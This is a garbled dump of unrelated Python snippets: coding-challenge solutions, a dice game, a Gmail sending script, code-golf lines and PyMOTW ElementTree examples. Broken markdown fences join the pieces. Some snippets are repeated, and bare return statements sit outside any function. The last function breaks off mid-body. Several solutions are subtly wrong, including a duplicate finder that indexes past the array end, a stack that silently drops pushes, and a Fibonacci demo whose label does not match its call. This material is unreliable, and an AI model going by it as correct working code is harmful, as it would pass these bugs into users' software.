# // It can return any available phone number. Here we assume it returns 0.
# directory.get();
#
# // Assume it returns 1.
# directory.get();
#
# // The number 2 is available, so return true.
# directory.check(2);
#
# // It returns 2, the only number that is left.
# directory.get();
#
# // The number 2 is no longer available, so return false.
# directory.check(2);
#
# // Release number 2 back to the pool.
# directory.release(2);
#
# // Number 2 is available again, return true.
# directory.check(2);


from collections import deque


class PhoneDirectory:
    def __init__(self, maxNumbers: int):

        self.num = maxNumbers
        self.queue = deque([])
        for i in range(self.num):
            self.queue.append(i)

    def get(self) -> int:
        if len(self.queue) == 0:
            return -1
        num = self.queue.popleft()
        return num

    def check(self, number: int) -> bool:
        return number in self.queue

    def release(self, number: int) -> None:
        if number not in self.queue:
            self.queue.append(number)

# Given a linked list, determine if it has a cycle in it.
#
# To represent a cycle in the given linked list, we use an integer pos which
# represents the position (0-indexed) in the linked list where tail connects to.
# If pos is -1, then there is no cycle in the linked list.
#
# Input: head = [3,2,0,-4], pos = 1
# Output: true
# Explanation: There is a cycle in the linked list, where tail connects to the second node.
#
# Input: head = [1], pos = -1
# Output: false
# Explanation: There is no cycle in the linked list.


class ListNode:
    def __init__(self, val):
        self.val = val
        self.next = None


class Solution:
    def isCycle(self, head):
        pointer1 = head
        pointer2 = head.next

        while pointer1 != pointer2:
            if pointer2 is None or pointer2.next is None:
                return False
            pointer1 = pointer1.next
            pointer2 = pointer2.next.next
        return True


if __name__ == "__main__":
    arr = [3, 2, 0, -4]
    node = ListNode(arr[0])
    n = node
    for i in arr[1:]:
        n.next = ListNode(i)
        n = n.next
    ans = Solution().isCycle(node)
    print(ans)

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def diameterOfBinaryTree(self, root: TreeNode) -> int:

        self.depth = 1

        def findDepth(first):
            if not first:
                return 0
            ld = findDepth(first.left)
            rd = findDepth(first.right)
            self.depth = max(self.depth, ld + rd + 1)
            return max(ld, rd) + 1

        findDepth(root)
        return self.depth - 1

import random
import time as t


def actions(choice):
    h_sum = b_sum = 0
    print("Start playing the game now")
    t.sleep(1)
    for die in range(0, choice):
        person = random.randint(1, 6)
        t.sleep(1)
        print("human got", person)
        h_sum += person
    t.sleep(1)
    print("Total sum of human is:", h_sum)
    t.sleep(1)
    print("Now its time for the bot")
    t.sleep(1)
    for die in range(0, choice):
        bot = random.randint(1, 6)
        t.sleep(1)
        print("Bot got", bot)
        b_sum += bot
    t.sleep(1)
    print("Total sum  of bot is:", b_sum)
    t.sleep(2)

    total = (
        "\n Human won"
        if h_sum > b_sum
        else "\nBot won"
        if h_sum < b_sum
        else "Its a tie"
    )
    print(total)
    t.sleep(1)


def play():
    die = 0
    rolling = ""
    while die == 0:
        choice = int(input("How many times you wamt to  be rolled?? (1-5)"))
        if choice > 0 and choice < 6:
            actions(choice)
            break
        else:
            print("Please enter the correct choice")
    print("Do you want to continue the game??")
    while rolling != "Yes":
        rolling = input().lower().capitalize()
        if rolling == "Yes":
            play()
        else:
            print("It was wonderful playing with a bot")
        break


play()

def deleteDigit(n):
    num = str(n)
    result = list(int("".join(num[:i] + num[1 + i :])) for i in range(len(num)))
    return max(result)

def evenDigitsOnly(n):
    digits_of_n = []
    while n > 0:
        rem = n % 10
        digits_of_n.append(rem)
        n = int(n / 10)
    for i in range(len(digits_of_n)):
        if digits_of_n[i] % 2 != 0:
            return False
    return True

def longestDigitsPrefix(inputString):
    count = 0
    for i in range(len(inputString)):
        if inputString[i].isdigit():
            count += 1
        else:
            return inputString[0:count]
    return inputString

# Input: nums = [131, 11, 48]
# Output: 1 3 4 8
# Explanation: 1, 3, 4, and 8 are only distinct
# digits that can be extracted from the numbers
# of the array.


def Dis_array(arr):
    dup = []
    for i in arr:
        length = len(str(i))
        i = str(i)
        for j in range(length):
            if i[j] in dup:
                pass
            else:
                dup.append(i[j])

    print(dup)


arr = [131, 11, 48]
Dis_array(arr)

# Input: nums = [131, 11, 48]
# Output: 1 3 4 8
# Explanation: 1, 3, 4, and 8 are only distinct
# digits that can be extracted from the numbers
# of the array.


def Dis_array(arr):
    dup = []
    for i in arr:
        length = len(str(i))
        i = str(i)
        for j in range(length):
            if i[j] in dup:
                pass
            else:
                dup.append(i[j])

    print(dup)


arr = [131, 11, 48]
Dis_array(arr)

class Stack:
    def __init__(self, limit=10):
        self.stack = []
        self.limit = limit

    def push(self, n):
        if len(self.stack) > self.limit:
            self.doublelimit()
        else:
            self.stack.append(n)

    def pop(self):
        if len(self.stack) > 0:
            self.stack.pop()

    def is_empty(self):
        if len(self.stack) == 0:
            return True
        else:
            return False

    def PrintStack(self):
        for i in self.stack:
            print(i)

    def Length(self):
        n = len(self.stack)
        print(n)

    # logic for douling the stack
    def doublelimit(self):
        newStack = self.stack
        self.limit = 2 * self.limit
        self.stack = newStack


sta = Stack(5)


sta.push(1)
sta.push(2)
sta.push(1)
sta.push(2)
sta.push(2)
sta.push(2)


sta.PrintStack()


sta.Length()

# def removeDuplicateStrings(a):
#     return list(OrderedDict.fromkeys(a))
# 64

# removeDuplicateStrings = lambda a: list(OrderedDict.fromkeys(a))
# 60

return list(OrderedDict.fromkeys(*eval(dir()[0])))
# 49

def dynamicArray(n, queries):
    Q = len(queries)
    seqList = [[] for _ in range(n)]
    lastAnswer = 0
    la = []
    for i in range(Q):
        t, x, y = queries[i][0], queries[i][1], queries[i][2]
        if t == 1:
            seqList[(x ^ lastAnswer) % n].append(y)
        else:
            lastAnswer = seqList[(x ^ lastAnswer) % n][
                y % len(seqList[(x ^ lastAnswer) % n])
            ]
            print(lastAnswer)
            la.append(lastAnswer)
    return la

def extractEachKth(inputArray, k):
    inp = []
    for i in range(len(inputArray)):
        if (i + 1) % k == 0:
            pass
        else:
            inp.append(inputArray[i])
    return inp

from Product import Product


class Electronic(Product):
    def __init__(self, name, price, power_rating):
        super().__init__(name, price)
        self.power_rating = power_rating

    def __str__(self):
        return f"{super().__str__()} is rated at {self.power_rating}"

__doc__ = """Legacy interface to the BeautifulSoup HTML parser.```


```py

__all__ = ["parse", "convert_tree"]

from .soupparser import convert_tree, parse as _parse


def parse(file, beautifulsoup=None, makeelement=None):
    root = _parse(file, beautifulsoup=beautifulsoup, makeelement=makeelement)
    return root.getroot()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyEmbedded XML string```


```py

# end_pymotw_header
from xml.etree.ElementTree import XML


def show_node(node):
    print(node.tag)
    if node.text is not None and node.text.strip():
        print('  text: "%s"' % node.text)
    if node.tail is not None and node.tail.strip():
        print('  tail: "%s"' % node.tail)
    for name, value in sorted(node.attrib.items()):
        print('  %-4s = "%s"' % (name, value))
    for child in node:
        show_node(child)


parsed = XML(
    """
<root>
  <group>
    <child id="a">This is child "a".</child>
    <child id="b">This is child "b".</child>
  </group>
  <group>
    <child id="c">This is child "c".</child>
  </group>
</root>```


```py
)

print("parsed =", parsed)

for elem in parsed:
    show_node(elem)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyEmbedded XML string with ID values```


```py

# end_pymotw_header
from xml.etree.ElementTree import XMLID

tree, id_map = XMLID(
    """
<root>
  <group>
    <child id="a">This is child "a".</child>
    <child id="b">This is child "b".</child>
  </group>
  <group>
    <child id="c">This is child "c".</child>
  </group>
</root>```


```py
)

for key, value in sorted(id_map.items()):
    print("%s = %s" % (key, value))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCreating XML documents```


```py

# end_pymotw_header
from xml.etree.ElementTree import Element, SubElement, Comment, tostring

top = Element("top")

comment = Comment("Generated for PyMOTW")
top.append(comment)

child = SubElement(top, "child")
child.text = "This child contains text."

child_with_tail = SubElement(top, "child_with_tail")
child_with_tail.text = "This child has text."
child_with_tail.tail = 'And "tail" text.'

child_with_entity_ref = SubElement(top, "child_with_entity_ref")
child_with_entity_ref.text = "This & that"

print(tostring(top))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCreating XML documents```


```py

# end_pymotw_header
from xml.etree.ElementTree import Element, SubElement, Comment
from ElementTree_pretty import prettify

top = Element("top")

comment = Comment("Generated for PyMOTW")
top.append(comment)

child = SubElement(top, "child")
child.text = "This child contains text."

child_with_tail = SubElement(top, "child_with_tail")
child_with_tail.text = "This child has text."
child_with_tail.tail = 'And "tail" text.'

child_with_entity_ref = SubElement(top, "child_with_entity_ref")
child_with_entity_ref.text = "This & that"

print(prettify(top))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyConvert CSV file of podcasts to XML```


```py

# end_pymotw_header
import csv
from xml.etree.ElementTree import Element, SubElement, Comment, tostring
import datetime
from ElementTree_pretty import prettify

generated_on = str(datetime.datetime.now())

# Configure one attribute with set()
root = Element("opml")
root.set("version", "1.0")

root.append(Comment("Generated by ElementTree_csv_to_xml.py for PyMOTW"))

head = SubElement(root, "head")
title = SubElement(head, "title")
title.text = "My Podcasts"
dc = SubElement(head, "dateCreated")
dc.text = generated_on
dm = SubElement(head, "dateModified")
dm.text = generated_on

body = SubElement(root, "body")

with open("podcasts.csv", "rt") as f:
    current_group = None
    reader = csv.reader(f)
    for row in reader:
        group_name, podcast_name, xml_url, html_url = row
        if current_group is None or group_name != current_group.text:
            # Start a new group
            current_group = SubElement(body, "outline", {"text": group_name})
        # Add this podcast to the group,
        # setting all its attributes at
        # once.
        podcast = SubElement(
            current_group,
            "outline",
            {"text": podcast_name, "xmlUrl": xml_url, "htmlUrl": html_url},
        )

print(prettify(root))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDump the OPML in plain text```


```py

# end_pymotw_header
from xml.etree import ElementTree
import pprint

with open("podcasts.opml", "rt") as f:
    tree = ElementTree.parse(f)

for node in tree.iter():
    print(node.tag)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDump the OPML in plain text```


```py

# end_pymotw_header
from xml.etree import ElementTree

with open("data.xml", "rt") as f:
    tree = ElementTree.parse(f)

node = tree.find("entity_expansion")
print(node.tag)
print("  in attribute:", node.attrib["attribute"])
print("  in text     :", node.text.strip())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCreating XML documents with lists of nodes```


```py

# end_pymotw_header
from xml.etree.ElementTree import Element, tostring
from ElementTree_pretty import prettify

top = Element("top")

children = [Element("child", num=str(i)) for i in range(3)]

top.extend(children)

print(prettify(top))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCreating XML documents with lists of nodes```


```py

# end_pymotw_header
from xml.etree.ElementTree import Element, SubElement, tostring, XML
from ElementTree_pretty import prettify

top = Element("top")

parent = SubElement(top, "parent")

children = XML('<root><child num="0" /><child num="1" />' '<child num="2" /></root>')
parent.extend(children)

print(prettify(top))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCreating XML documents with lists of nodes```


```py

# end_pymotw_header
from xml.etree.ElementTree import Element, SubElement, tostring, XML
from ElementTree_pretty import prettify

top = Element("top")

parent_a = SubElement(top, "parent", id="A")
parent_b = SubElement(top, "parent", id="B")

# Create children
children = XML('<root><child num="0" /><child num="1" />' '<child num="2" /></root>')

# Set the id to the Python object id of the node
# to make duplicates easier to spot.
for c in children:
    c.set("id", str(id(c)))

# Add to first parent
parent_a.extend(children)

print("A:")
print(prettify(top))
print()

# Copy nodes to second parent
parent_b.extend(children)

print("B:")
print(prettify(top))
print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDump the OPML in plain text```


```py

# end_pymotw_header
from xml.etree import ElementTree

with open("podcasts.opml", "rt") as f:
    tree = ElementTree.parse(f)

for node in tree.findall(".//outline/outline"):
    url = node.attrib.get("xmlUrl")
    print(url)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDump the OPML in plain text```


```py

# end_pymotw_header
from xml.etree import ElementTree

with open("podcasts.opml", "rt") as f:
    tree = ElementTree.parse(f)

for node in tree.findall(".//outline"):
    url = node.attrib.get("xmlUrl")
    if url:
        print(url)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDump the OPML in plain text```


```py

# end_pymotw_header
from xml.etree import ElementTree

with open("data.xml", "rt") as f:
    tree = ElementTree.parse(f)

node = tree.find("./with_attributes")
print(node.tag)
for name, value in sorted(node.attrib.items()):
    print('  %-4s = "%s"' % (name, value))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDump the OPML in plain text```


```py

# end_pymotw_header
from xml.etree import ElementTree

with open("data.xml", "rt") as f:
    tree = ElementTree.parse(f)

for path in ["./child", "./child_with_tail"]:
    node = tree.find(path)
    print(node.tag)
    print("  child node text:", node.text)
    print("  and tail text  :", node.tail)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyParse an OPML file and show something about the results.```


```py

# end_pymotw_header
from xml.etree import ElementTree

with open("podcasts.opml", "rt") as f:
    tree = ElementTree.parse(f)

print(tree)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyConvert XML list of podcasts to a CSV file.```


```py

# end_pymotw_header
import csv
import io
from xml.etree.ElementTree import XMLParser
import sys


class PodcastListToCSV(object):
    def __init__(self, outputFile):
        self.writer = csv.writer(outputFile, quoting=csv.QUOTE_NONNUMERIC)
        self.group_name = ""

    def start(self, tag, attrib):
        if tag != "outline":
            # Ignore anything not part of the outline
            return
        if not attrib.get("xmlUrl"):
            # Remember the current group
            self.group_name = attrib["text"]
        else:
            # Output a podcast entry
            self.writer.writerow(
                (
                    self.group_name,
                    attrib["text"],
                    attrib["xmlUrl"],
                    attrib.get("htmlUrl", ""),
                )
            )

    def end(self, tag):
        "Ignore closing tags"

    def data(self, data):
        "Ignore data inside nodes"

    def close(self):
        "Nothing special to do here"


target = PodcastListToCSV(sys.stdout)
parser = XMLParser(target=target)
with open("podcasts.opml", "rt") as f:
    for line in f:
        parser.feed(line)
parser.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyPretty-print function for ElementTree```


```py

# end_pymotw_header
from xml.etree import ElementTree
from xml.dom import minidom


def prettify(elem):
    """Return a pretty-printed XML string for the Element.
    """
    rough_string = ElementTree.tostring(elem, "utf-8")
    reparsed = minidom.parseString(rough_string)
    return reparsed.toprettyxml(indent="  ")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyShow the events encountered while processing an XML input```


```py

# end_pymotw_header
from xml.etree.ElementTree import iterparse

depth = 0
prefix_width = 8
prefix_dots = "." * prefix_width
line_template = "".join(
    [
        "{prefix:<0.{prefix_len}}",
        "{event:<8}",
        "{suffix:<{suffix_len}} ",
        "{node.tag:<12} ",
        "{node_id}",
    ]
)

EVENT_NAMES = ["start", "end", "start-ns", "end-ns"]

for (event, node) in iterparse("podcasts.opml", EVENT_NAMES):
    if event == "end":
        depth -= 1

    prefix_len = depth * 2

    print(
        line_template.format(
            prefix=prefix_dots,
            prefix_len=prefix_len,
            suffix="",
            suffix_len=(prefix_width - prefix_len),
            node=node,
            node_id=id(node),
            event=event,
        )
    )

    if event == "start":
        depth += 1

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDump the OPML in plain text```


```py

# end_pymotw_header
from xml.etree import ElementTree

with open("podcasts.opml", "rt") as f:
    tree = ElementTree.parse(f)

for node in tree.iter("outline"):
    name = node.attrib.get("text")
    url = node.attrib.get("xmlUrl")
    if name and url:
        print("  %s" % name)
        print("    %s" % url)
    else:
        print(name)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCreating XML documents```


```py

# end_pymotw_header
import io
import sys
from xml.etree.ElementTree import Element, SubElement, Comment, ElementTree

top = Element("top")

comment = Comment("Generated for PyMOTW")
top.append(comment)

child = SubElement(top, "child")
child.text = "This child contains text."

child_with_tail = SubElement(top, "child_with_tail")
child_with_tail.text = "This child has regular text."
child_with_tail.tail = 'And "tail" text.'

child_with_entity_ref = SubElement(top, "child_with_entity_ref")
child_with_entity_ref.text = "This & that"

empty_child = SubElement(top, "empty_child")

ElementTree(top).write(sys.stdout.buffer)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCreating XML documents```


```py

# end_pymotw_header
import io
import sys
from xml.etree.ElementTree import Element, SubElement, ElementTree

top = Element("top")

child = SubElement(top, "child")
child.text = "Contains text."

empty_child = SubElement(top, "empty_child")

for method in ["xml", "html", "text"]:
    print(method)
    sys.stdout.flush()
    ElementTree(top).write(sys.stdout.buffer, method=method)
    print("\n")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyConvert XML list of podcasts to a CSV file.```


```py

# end_pymotw_header
import csv
from xml.etree.ElementTree import iterparse
import sys

writer = csv.writer(sys.stdout, quoting=csv.QUOTE_NONNUMERIC)

group_name = ""

parsing = iterparse("podcasts.opml", events=["start"])

for (event, node) in parsing:
    if node.tag != "outline":
        # Ignore anything not part of the outline
        continue
    if not node.attrib.get("xmlUrl"):
        # Remember the current group
        group_name = node.attrib["text"]
    else:
        # Output a podcast entry
        writer.writerow(
            (
                group_name,
                node.attrib["text"],
                node.attrib["xmlUrl"],
                node.attrib.get("htmlUrl", ""),
            )
        )
````

```pyGiven an array of integers, find the pair of adjacent elements that has the largest product and return that product.

Example:
For inputArray = [3, 6, -2, -5, 7, 3], the output should be adjacentElementsProduct(inputArray) = 21.
7 and 3 produce the largest product."""


def adjacentElementsProduct(inputArray):
    # Step 1: Initially, define an empty array where we will store the products of adjacent elements from the input array.
    ArrayEnd = []
    # Step 2: Using a for-loop, we go over all entries of the input array, calculating the products of adjacent elements
    # and appending them to the empty array from step 1.
    for i in range(len(inputArray) - 1):
        ArrayEnd.append(inputArray[i] * inputArray[i + 1])
    # Step 3: We seek the largest entry in "ArrayEnd" from step 1, using the max() function.
    maximum = max(ArrayEnd)
    return maximum

def findEmailDomain(address):
    address_spl = address.split("@")
    c = [i for i in address_spl]
    if len(address_spl) == 2:
        return c[1]
    if len(address_spl) == 3:
        return c[2]

import smtplib

# REMEMBER : dont send mails through public computers or servers

# connecting to googles serevrs
serverToLogin = smtplib.SMTP("smtp.gmail.com", 587)
# Username
userName = str(input("Username for Gmail : "))
# password
password = str(input("Password Of Account : "))
# Logging in
serverToLogin.login(userName, password)


def sendMail():
    yourEmail = str(input("Your Email Address : "))  # senders email address
    toSendEmail = str(input("Receivers Email Address"))  # receivers email address
    messageHead = str(input("Message Head : "))  # Message head
    messageBody = str(input("Message : "))  # main message
    fullMessage = messageHead + "\n" + messageBody  # full message
    serverToLogin.sendmail(
        yourEmail, toSendEmail, fullMessage
    )  # sending email address through server


while True:
    toSendOrNot = str(input("Send or End : "))
    if toSendOrNot == "Send":
        print("\n")
        print(sendMail())
    else:
        quit()

def areEquallyStrong(yourLeft, yourRight, friendsLeft, friendsRight):
    personal_max = max(yourLeft, yourRight)
    friend_max = max(friendsLeft, friendsRight)
    sum1 = yourLeft + yourRight
    sum2 = friendsLeft + friendsRight
    if sum1 == sum2 and personal_max == friend_max:
        return True
    return False

# Given a column title as appear in an Excel sheet, return its corresponding column number.
#
# For example:
#
#     A -> 1
#     B -> 2
#     C -> 3
#     ...
#     Z -> 26
#     AA -> 27
#     AB -> 28
#     ...
# Example 1:
#
# Input: "A"
# Output: 1
# Example 2:
#
# Input: "AB"
# Output: 28
# Example 3:
#
# Input: "ZY"
# Output: 701


class Solution:
    def titleToNumber(self, s):
        Sum = 0
        for exp, char in enumerate(s[::-1]):
            Sum += (ord(char) - 65 + 1) * 26 ** exp

        return Sum

# Given a positive integer, return its corresponding column title as appear in an Excel sheet.
#
# For example:
#
#     1 -> A
#     2 -> B
#     3 -> C
#     ...
#     26 -> Z
#     27 -> AA
#     28 -> AB
#     ...
# Example 1:
#
# Input: 1
# Output: "A"
# Example 2:
#
# Input: 28
# Output: "AB"
# Example 3:
#
# Input: 701
# Output: "ZY"


class Solution:
    def convertToTitle(self, n):
        dict = {
            0: "Z",
            1: "A",
            2: "B",
            3: "C",
            4: "D",
            5: "E",
            6: "F",
            7: "G",
            8: "H",
            9: "I",
            10: "J",
            11: "K",
            12: "L",
            13: "M",
            14: "N",
            15: "O",
            16: "P",
            17: "Q",
            18: "R",
            19: "S",
            20: "T",
            21: "U",
            22: "V",
            23: "W",
            24: "X",
            25: "Y",
        }
        arr = []

        if n <= 26:
            return dict[n % 26]

        while n > 0:
            r = n % 26

            n = n // 26

            if r == 0:
                n = n - 1

            arr = [dict[r]] + arr

        return "".join(arr)

class Solution:
    def getOddOccurrence(self, arr, n):
        # code here
        ans = 0
        for i in range(n):
            ans ^= arr[i]
        return ans

# 52
# def triangleExistence(t):
#     t.sort()
#     return t[0] + t[1] > t[2]

# 46
# triangleExistence = lambda t: sum(t) - max(t) > max(t)

# 45
# t, = eval(dir()[0])
#
# t.sort()
# return t[0] + t[1] > t[2]

# 43
# t, = eval(dir()[0])
# return sum(t) - max(t) > max(t)

# 40
a, b, c = sorted(*eval(dir()[0]))
return a + b > c

class Solution:
    def trailingZeroes(self, n: int) -> int:
        count = 0
        m = 5
        while n / m >= 1:
            count += int(n / m)
            m *= 5
        return count

from __future__ import print_function


class FenwickTree:
    def __init__(self, SIZE):  # create fenwick tree with size SIZE
        self.Size = SIZE
        self.ft = [0 for i in range(0, SIZE)]

    def update(self, i, val):  # update data (adding) in index i in O(lg N)
        while i < self.Size:
            self.ft[i] += val
            i += i & (-i)

    def query(self, i):  # query cumulative data from index 0 to i in O(lg N)
        ret = 0
        while i > 0:
            ret += self.ft[i]
            i -= i & (-i)
        return ret


if __name__ == "__main__":
    f = FenwickTree(100)
    f.update(1, 20)
    f.update(4, 4)
    print(f.query(1))
    print(f.query(3))
    print(f.query(4))
    f.update(2, -5)
    print(f.query(1))
    print(f.query(3))

# Fibonacci Number
# 0 1 1 2 3 5 8 13 21 .....
# find 6th number in Fibonacci series which is 8


def fib(n):
    a = 0
    b = 1

    if n == 0:
        return a
    elif n == 1:
        return b

    for i in range(2, n + 1):
        value = a + b

        a = b
        b = value

    return value


if __name__ == "__main__":
    print("The fibonacci number at 6th place is : " + str(fib(8)))

import re

with open("./test.txt", "r") as f:
    test_string = f.read()
    regex = re.compile(r"^([0-9]+)$", re.MULTILINE)
    result = regex.findall(test_string)
    print(result)

# Given an array of integers nums containing n + 1 integers where each integer is in the range [1, n] inclusive.

# There is only one repeated number in nums, return this repeated number.

# Example 1:

# Input: nums = [1,3,4,2,2]
# Output: 2


def findDuplicate(arr):
    for i in range(len(arr)):
        if arr[i] == arr[i + 1]:
            return arr[i]
        else:
            pass


arr = [1, 3, 4, 2, 2]

print(findDuplicate(arr))
```

```py
# Tree Node
class Node:
    def __init__(self, val):
        self.right = None
        self.data = val
        self.left = None
```

```py
# root : the root Node of the given BST
# target : the target sum
def isPairPresent(root, target):
    # code here.
    inorderArr = set()

    def inorder(node):
        if node:
            inorder(node.left)
            inorderArr.add(node.data)
            inorder(node.right)

    inorder(root)
    for i in inorderArr:
        if target - i in inorderArr:
            return 1
    return 0

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def findBottomLeftValue(self, root: TreeNode) -> int:
        queue = deque([root])
        visited = set()
        while queue:
            size = len(queue)
            leftmost = math.inf
            for i in range(size):
                node = queue.popleft()
                if leftmost == math.inf:
                    leftmost = node.val
                if node.left:
                    queue.append(node.left)
                if node.right:
                    queue.append(node.right)
            if not queue:
                return leftmost
        return 0

from collections import Counter


def duplicates(arr, n):
    # code here
    duplicates = []
    for i in range(n):
        arr[arr[i] % n] += n

    for i in range(n):
        if (arr[i] / n) >= 2:
            duplicates.append(i)
    duplicates.sort()
    return duplicates if duplicates else [-1]

class Solution:
    def findSwapValues(self, a, n, b, m):
        # Your code goes here
        sa = sum(a)
        sb = sum(b)
        itb = iter(b)
        b = dict(zip(itb, itb))
        for i in a:
            if ((sb - sa + 2 * i) / 2) in b:
                return 1
        return -1

# For your reference:
#
# SinglyLinkedListNode:
#     int data
#     SinglyLinkedListNode next
#
#
def findMergeNode(head1, head2):
    ptr1 = head1
    ptr2 = head2
    while ptr1 != ptr2:
        if ptr1.next == None:
            ptr1 = head2
        else:
            ptr1 = ptr1.next
        if ptr2.next == None:
            ptr2 = head1
        else:
            ptr2 = ptr2.next
    return ptr2.data

def count_substring(string, sub_string):
    c = 0
    for i in range(0, len(string) - len(sub_string) + 1):
        if string[i : i + len(sub_string)] == sub_string:
            c += 1
    return c


if __name__ == "__main__":
    string = input().strip()
    sub_string = input().strip()

    count = count_substring(string, sub_string)
    print(count)

if __name__ == "__main__":
    n = int(input())
    arr = map(int, input().split())
    arr = set(arr)
    arr = list(arr)
    print(sorted(arr)[-2])

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def findDuplicateSubtrees(self, root: TreeNode) -> List[TreeNode]:
        tree = collections.defaultdict()
        tree.default_factory = tree.__len__
        c = collections.Counter()
        anslist = []

        def find(node):
            if node:
                tid = tree[node.val, find(node.left), find(node.right)]
                c[tid] += 1
                if c[tid] == 2:
                    anslist.append(node)
                return tid

        find(root)
        return anslist

# Given two strings s and t which consist of only lowercase letters.
#
# String t is generated by random shuffling string s and then add one more letter at a random position.
#
# Find the letter that was added in t.
#
# Example:
#
# Input:
# s = "abcd"
# t = "abcde"
#
# Output:
# e
#
# Explanation:
# 'e' is the letter that was added.


class Solution:
    def findTheDifference(self, s, t):
        if not s:
            return t
        c = ord(s[0])

        for i in s[1:]:
            c = c ^ ord(i)
        for j in t:
            c = c ^ ord(j)

        return chr(c)

# You are given a string that represents time in the format hh:mm. Some of the digits are blank
# (represented by ?). Fill in ? such that the time represented by this string is the maximum
# possible. Maximum time: 23:59, minimum time: 00:00. You can assume that input string is always valid.
#
# Example 1:
#
# Input: "?4:5?"
# Output: "14:59"
# Example 2:
#
# Input: "23:5?"
# Output: "23:59"
# Example 3:
#
# Input: "2?:22"
# Output: "23:22"
# Example 4:
#
# Input: "0?:??"
# Output: "09:59"
# Example 5:
#
# Input: "??:??"
# Output: "23:59"


class Solution:
    def findMax(self, time):
        arr = []
        for c in time:
            arr.append(c)

        if arr[0] == "?":
            if arr[1] <= "3" or arr[1] == "?":
                arr[0] = "2"
            else:
                arr[0] = "1"
        if arr[1] == "?":
            if arr[0] <= "1":
                arr[1] = "9"
            else:
                arr[1] = "3"

        if arr[3] == "?":
            arr[3] = "5"
        if arr[4] == "?":
            arr[4] = "9"
        maxtime = ""
        for x in arr:
            maxtime += x
        return maxtime


if __name__ == "__main__":
    times = [
        "23:5?",
        "2?:22",
        "0?:??",
        "1?:??",
        "?4:??",
        "?3:??",
        "??:??",
        "?4:5?",
        "?4:??",
        "?3:??",
        "23:5?",
        "2?:22",
        "0?:??",
        "1?:??",
        "?4:0?",
        "?9:4?",
    ]

    for time in times:
        print(time + "  => " + Solution().findMax(time))

# Given an array of integers nums containing n + 1 integers where each integer is in the range [1, n] inclusive.

# There is only one repeated number in nums, return this repeated number.

# Example 1:

# Input: nums = [1,3,4,2,2]
# Output: 2


def findDuplicate(arr):
    for i in range(len(arr)):
        if arr[i] == arr[i + 1]:
            return arr[i]
        else:
            pass


arr = [1, 3, 4, 2, 2]

print(findDuplicate(arr))

class Solution:
    def find(self, arr):
        dic = {}
        for num in arr:
            dic[num] = dic.get(num, 0) + 1
        for num in arr:
            if dic[num] == 1:
                return num


if __name__ == "__main__":
    arr = [2, 2, 3, 4, 2, 3, 4, 1, 5, 5, 6, 6]
    print(Solution().find(arr))

if __name__ == "__main__":
    n = int(input())
    student_marks = {}
    for _ in range(n):
        name, *line = input().split()
        scores = list(map(float, line))
        student_marks[name] = scores
    query_name = input()
    res = 0
    for i in student_marks.get(query_name):
        res += i
    print("%.2f" % (res / 3))
```

````py
-The sieve of Eratosthenes is an algorithm used to find prime numbers, less than or equal to a given value.
-Illustration: https://upload.wikimedia.org/wikipedia/commons/b/b9/Sieve_of_Eratosthenes_animation.gif```


```py
from __future__ import print_function


from math import sqrt


def SOE(n):
    check = round(sqrt(n))  # Need not check for multiples past the square root of n

    sieve = [
        False if i < 2 else True for i in range(n + 1)
    ]  # Set every index to False except for index 0 and 1

    for i in range(2, check):
        if sieve[i] == True:  # If i is a prime
            for j in range(
                i + i, n + 1, i
            ):  # Step through the list in increments of i(the multiples of the prime)
                sieve[j] = False  # Sets every multiple of i to False

    for i in range(n + 1):
        if sieve[i] == True:
            print(i, end=" ")

from collections import Counter


class Solution:
    def firstUniqChar(self, s: str) -> int:
        c = Counter(s)
        for i in range(len(s)):
            if c[s[i]] == 1:
                return i
        return -1

# Given an unsorted integer array, find the smallest missing positive integer.
#
# Example 1:
#
# Input: [1,2,0]
# Output: 3
# Example 2:
#
# Input: [3,4,-1,1]
# Output: 2
# Example 3:
#
# Input: [7,8,9,11,12]
# Output: 1


class Solution:
    def firstMissingPositive(self, nums):
        dict = {}
        for num in nums:
            dict[num] = 1

        for i in range(1, len(nums) + 2):
            if i not in dict:
                return i

        return -1

# Given a string, find the first non-repeating character in it and
# return it's index. If it doesn't exist, return -1.
#
# Examples:
#
# s = "leetcode"
# return 0.
#
# s = "loveleetcode",
# return 2.
# Note: You may assume the string contain only lowercase letters.

import collections


class Solution:
    def firstUniqChar(self, s):
        if s == "":
            return -1
        dict = collections.defaultdict(int)

        for c in s:
            dict[c] += 1

        for c in s:
            if dict[c] == 1:
                return s.index(c)
        return -1
````

````py
The Fisher–Yates shuffle is an algorithm for generating a random permutation of a finite sequence.
For more details visit
wikipedia/Fischer-Yates-Shuffle.```


```py
import random


def FYshuffle(LIST):
    for i in range(len(LIST)):
        a = random.randint(0, len(LIST) - 1)
